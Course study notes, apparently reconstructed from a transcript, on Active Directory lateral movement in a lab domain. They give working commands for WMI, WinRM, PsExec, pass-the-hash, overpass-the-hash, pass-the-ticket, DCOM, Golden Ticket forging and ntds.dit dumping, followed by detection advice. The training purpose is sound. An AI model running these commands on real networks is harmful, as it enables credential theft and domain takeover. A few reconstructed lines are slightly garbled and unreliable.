PEN-200 Module 17 — Active Directory: Lateral Movement (block ADLM: WMI/WinRM, PsExec, Pass-the-Hash, Overpass-the-Hash, Pass-the-Ticket, DCOM; persistence: Golden Ticket, Shadow Copies)

Fuente: material del curso correspondiente (sin video público)

Objective

Once a foothold and a set of domain credentials exist, the goal shifts from "get in" to "move around": authenticate as a user whose hash or ticket we possess, on a machine we've never touched, using the authentication protocols Windows itself offers. The module ladder:

  1. Remote process creation — WMI (via deprecated wmic, then PowerShell/CIM), WinRS/WinRM and PowerShell Remoting.
  2. Interactive shells — PsExec from a compromised Windows host.
  3. Credential replay — Pass the Hash (NTLM), Overpass the Hash (NTLM hash → Kerberos TGT), Pass the Ticket (re-inject a TGS).
  4. Protocol abuse — DCOM via the MMC20.Application COM object.
  5. Persistence / escalation to domain dominance — Golden Ticket (forge TGTs with the krbtgt hash) and Volume Shadow Copies to steal ntds.dit and dump every domain credential offline.

Target surface

  • Domain: corp.com. Lab hosts referenced (names verbatim from audio): Windows 11 workstation client74 (the "already compromised" foothold, also used for PsExec/DCOM demos), Windows 10 client client76 (used to simulate cached credentials and Pass the Ticket), file server files04 (Windows Server 2022), web04 (restricted backup folder), and the domain controller (DC1).
  • Users (names verbatim): jen — domain user and local administrator on the target machines (ASR alternates "gen"/"Gen"/"Jen"; normalized to jen throughout); jeff — the logged-in user on the clients; dave — user with privileged access to the web04 backup folder; jeffadmin — domain admin used for the DC-side steps.
  • The PsExec demo quotes a password for corp\jen — redacted here as [REDACTED].
  • Transcript note: the ASR output contains no lab IP addresses (192.168.x) — the videos narrate over screen captures, so all network locations are given as hostnames only. Mimikatz command names are heavily garbled by ASR ("SecureLSA" = sekurlsa::, "Secure LSA Tickets Export" = sekurlsa::tickets /export, "Kirby" = .kirbi); the listings below use the correct syntax, with the ASR source noted where the reconstruction is non-trivial.

Techniques

1. WMI: remote process creation — ADLM_01_01

Windows Management Instrumentation is an object-oriented automation feature; it can create processes via the Create method of the Win32_Process class. Requirement: credentials of a member of the target's local Administrators group (a domain user qualifies). The demo runs as jen against files04, tested first from client74 while logged in as jeff.

Classic wmic (recently deprecated, still worth knowing):

wmic /node:<target> /user:<user> /password:<pass> process call create "calc.exe"
:: job returns the new PID and a Return Value of 0 = success

PowerShell translation (three building blocks):

# 1) PSCredential object
$user = '<user>'
$pass = '<pass>'
$securepass = $pass | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $securepass)

# 2) CIM session over DCOM (WMI's classic transport; DCOM beats the WinRM default for this attack)
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <target> -Credential $cred -SessionOption $options

# 3) invoke Win32_Process.Create
$calc = 'calc.exe'
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $calc}

Verification: list processes on the target — a new calculator process confirms execution.

Escalation to a shell: replace the payload with a Base64-encoded PowerShell reverse shell (encoding avoids escaping special characters inside the WMI payload). The course uses a short Python helper that embeds the shell in a payload variable and prints the Base64 (replace IP/port with the Kali attacker's); then set up nc -lvnp 443 on Kali and invoke the WMI script from client74 — the listener catches a reverse shell as jen on the internal server.

2. WinRM: WinRS and PowerShell Remoting — ADLM_01_01

WinRM is the alternative remote-management service to WMI/DCOM.

winrs -r:<target> -u:<user> -p:<pass> hostname
winrs -r:<target> -u:<user> -p:<pass> whoami      :: commands provably execute on files04

Full lateral movement: swap the command for the Base64-encoded reverse shell — with a listener running, files04 calls back.

PowerShell Remoting is the built-in equivalent:

$session = New-PSSession -ComputerName <target> -Credential $cred
Enter-PSSession 1        # session ID from New-PSSession output; prompt now lives on the target

3. PsExec (from a Windows foothold) — ADLM_01_02

PsExec (SysInternals suite — present on client74 under C:\Tools\SysinternalsSuite) is "intended to replace Telnet-like applications" and executes processes remotely with an interactive console:

psexec64.exe -i \\<target-hostname> -u corp\jen -p [REDACTED] cmd
  • -i = interactive session; target host prepended with \\; -u/-p for domain credentials; final argument is the process (cmd).
  • Result: an interactive shell directly on the target as the jen domain account, without involving Kali to catch a reverse shell — authentication is initiated by the compromised host itself.
  • ASR renders the tool name "PSEgzek" and garbles the flags as "-u!"/"-p!" — normalized to the standard -i/-u/-p shape above.

4. Pass the Hash — ADLM_01_03

Authenticate to a remote system with the user's NTLM hash instead of the plaintext password. From Kali, Impacket's wmiexec.py (ASR: "wmi exec from the mPacket suite" = Impacket) against the local Administrator account on files04:

python3 wmiexec.py <user>@<target> -hashes :<ntlm-hash>

NTLM authentication yields code execution on the Windows Server 2022 box "directly from Kali, armed only with the user's NTLM hash." (The hash was gathered in a previous module — the technique assumes you already dumped it, e.g. with Mimikatz sekurlsa::logonpasswords.)

5. Overpass the Hash — ADLM_01_04

Pass the Hash locks you into NTLM authentication. Overpass the Hash abuses the NTLM hash to obtain a full Kerberos TGT, then uses Kerberos everywhere — useful because many environments disable NTLM but allow Kerberos.

Setup of the precondition (a cached credential): on client76 as jeff, Shift + right-click Notepad → Run as Different User → run as jen. Authentication caches jen's NTLM hash on the machine. Dump it from an elevated shell:

mimikatz # sekurlsa::logonpasswords

(ASR: "secure lsa logon passwords".) The output shows jen's cached NTLM hash. Now mint a process in her context that will authenticate with Kerberos only:

mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:<ntlm-hash> /run:powershell

(ASR: "SecureLSA PTH".) The spawned PowerShell runs as jen. klist shows no tickets — expected, since jen has not performed an interactive login. Request one by touching a network share:

klist                                    :: empty
net use \\files04                        :: authenticates → TGT requested
klist                                    :: now a TGT + a TGS for the cifs service on files04

The NTLM hash is converted into a Kerberos TGT. Any Kerberos-only tool now works in this session — including Microsoft's official psexec.exe, which does not accept password hashes:

psexec.exe \\files04 cmd                 :: shell on files04 as jen, via the reused TGT

(The course's PsExec section runs it from the Windows side; overpass-the-hash is what makes a hash-only attacker Kerberos-capable.)

6. Pass the Ticket — ADLM_01_05

A TGT can only be used on the machine that requested it, but a TGS (service ticket) can be exported and re-injected elsewhere to authenticate to one specific service — and for tickets belonging to the current user, no admin rights are needed.

Scenario: jen is logged into client76 but has no access to the web04 backup folder; dave does. First confirm the access denial from an elevated PowerShell:

ls \\web04\backup        :: access denied for jen

Then, in an elevated Mimikatz:

mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

Parses LSASS memory for all TGT/TGS in every session and writes them to disk as .kirbi files ("Kerberos Mimikatz format"; ASR garbles to "Kirby"). List them (dir *.kirbi — ASR: "filtering out on the Kirby extension"), spot the dave@<...>cifs/web04.kirbi shape, and inject it:

mimikatz # kerberos::ptt <dave-tgs>.kirbi
klist                    :: dave's ticket now sits in jen's session

Verify:

ls \\web04\backup        :: succeeds — jen is impersonating dave for that service

Caveat from the audio: the exported ticket is replayable only while valid (it lives with its original session's lifetime) — this is a shortcut technique, not persistence.

7. DCOM / MMC20.Application — ADLM_01_06

The Distributed Component Object Model lets a client instantiate COM objects on remote machines. From an elevated PowerShell on client74 as jen, instantiate a remote MMC 2.0 application object against files04 and drive its ExecuteShellCommand method (parameters: command, directory, parameters, window state):

$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "<target-ip>"))
$com.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc.exe", "7")

(ASR garbles the variable name to $DECOM and the arguments to "command and ccalc"; the listing is the standard reconstruction of GetTypeFromProgID + ExecuteShellCommand. The calculator spawns inside session 0 on the target, so no window appears on the RDP session — verify with tasklist filtering for calc after connecting to files04.)

Escalation: replace the payload with the same Base64-encoded PowerShell reverse shell generated by the Python script from the PsExec/WMI sections, listener running on Kali — "we gained a foothold on an additional internal box by abusing the DCOM MMC application."

8. Golden Ticket (persistence) — ADLM_02_01

A Golden Ticket forges TGTs signed with the krbtgt account's NTLM hash — anyone holding it can mint domain-admin tickets for any existing account. Prerequisite at this stage of the engagement: a domain admin account or a compromised domain controller.

Setup: attempt PsExec from client74 to the domain controller as jen — it fails (no permissions), establishing the baseline. Then, RDP to the DC as jeffadmin and extract the hash:

mimikatz # lsadump::lsa /patch        :: dumps krbtgt NTLM hash (+ domain SID)

Now back on client74 as the unprivileged jen (forging/injecting a golden ticket needs no admin rights and works from a non-domain-joined machine):

mimikatz # kerberos::purge                                  :: clear existing tickets
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:<domain-SID> /krbtgt:<krbtgt-ntlm-hash>

Notes from the audio:

  • The /krbtgt option (ASR: "kerbtgt instead of rc4") indicates the supplied hash belongs to the krbtgt account.
  • Domain SID comes from whoami /user.
  • Since July 2022 (Microsoft's krbtgt-account//id change) the forged ticket must claim an existing account — hence /user:jen.
  • Mimikatz defaults: user ID 500 (built-in Administrator RID) and group IDs covering the most privileged AD groups, including Domain Admins.

Then spawn a shell inside Mimikatz and move laterally:

mimikatz # misc::cmd
psexex → psexec \\dc-hostname cmd    :: succeeds
whoami                               :: jen
net user jen /domain /groups...      :: membership now includes Domain Admins

Key detail: PsExec must target the DC by hostname — that forces Kerberos (the forged TGT is used, i.e. an overpass-the-hash-style flow). Connecting by IP forces NTLM, and the DC would still refuse the unprivileged account. Payoff: "issue domain administrative TGTs to any existing low-privileged account, and thus obtain inconspicuous, legitimate-looking access to the entire AD domain."

9. Shadow Copies: stealing ntds.dit (persistence / domain credential dump) — ADLM_02_02

Volume Shadow Copy Service (VSS) snapshots files or entire volumes. As domain admins, abuse the signed Windows SDK binary vshadow.exe to copy the AD database while it is locked:

:: on DC1 as jeffadmin, elevated prompt
vshadow.exe -nw -p C:                  :: -nw disables writers (faster); -p stores the copy on disk
:: note the reported shadow copy device name, e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit
reg save HKLM\SYSTEM C:\system         :: system hive — needed to decrypt the database

(ASR garbles -nw/-p into quoted "-nw"/"-p" options and "ntds.dit" survives intact; the .bak extension on the copied files is rendered ".bac".)

Move both files to Kali and dump offline with Impacket:

secretsdump.py -ntds ntds.dit -system system local

Result: NTLM hashes and Kerberos keys for every AD user — crack them, or use them directly for pass-the-hash across the domain.

Detection & defense

  • WMI/DCOM process creation: remote Win32_Process.Create over DCOM shows up in Security event log 4688/4689 process-creation events with the WMI host process (WmiPrvSE.exe) as parent — an immediate IOC. Restricting DCOM/WMI remote access to management workstations kills the technique class; the course's reliance on local-admin credential reuse is a reminder that tiered admin models (no domain creds on workstations) remove the raw material.
  • PsExec: authentication is legitimate NTLM, so detection lands on the artifacts: service creation (7045) plus the characteristic PSEXESVC service name and named-pipe traffic. Restrict who can run psexec/create remote services; SysInternals binaries in C:\Tools on a compromised host are living-off-the-land, so inventory admin tools.
  • Pass the Hash: NTLM logons with a hash but no corresponding plaintext/interactive session — 4624 type 3 (network) logons from unusual sources; enforcing SMB signing limits relay variants. Long-term fix: disable NTLM where Kerberos suffices.
  • Overpass the Hash / Golden Ticket: both avoid NTLM and use Kerberos, but the golden ticket is detectable because forged TGTs carry Mimikatz-default values (RID 500 claim, default group set) and outlive normal ticket lifetimes — enable Protected Users, require smart-card/Kerberos armoring, monitor 4768/4769 anomalies, and twice-rotate the krbtgt password after any DC compromise to invalidate all forged tickets. The July 2022 behavior change (existing account required) shows Microsoft hardening exactly this abuse.
  • Pass the Ticket: a TGS used from a host/session that never requested it — correlate 4769 request origin with usage; restrict credential caching (the whole chain started with sekurlsa::logonpasswords on a cached jen login); LSASS protection (RunAsPPL, Credential Guard) blocks the export.
  • DCOM/MMC20.Application: remote COM instantiation is logged (Microsoft-Windows-DistributedCOM operational log); the execute-shell-command child of mmc.exe in session 0 is the giveaway. Disable remote DCOM activation for ordinary users.
  • Shadow copies / ntds.dit theft: vshadow.exe execution is abnormal on a DC and 4688 will show it; block domain admins from interactive/RDP logons to DCs (the demo needed jeffadmin on the console), alert on reg save of HKLM\SYSTEM and on any copy of ntds.dit, and treat shadow-copy creation on domain controllers as an incident. The offline secretsdump.py step happens entirely on the attacker's machine — after exfiltration, only credential rotation (including krbtgt) helps.
  • Cross-cutting: every technique in this module consumed credentials harvested earlier (local-admin NTLM hash, cached logon, domain admin access). Lateral-movement defense is therefore first credential hygiene — least privilege, no password reuse, tiered administration, LSASS protection — and second authentication-protocol hardening (Kerberos-only, ticket lifetime/rotation).
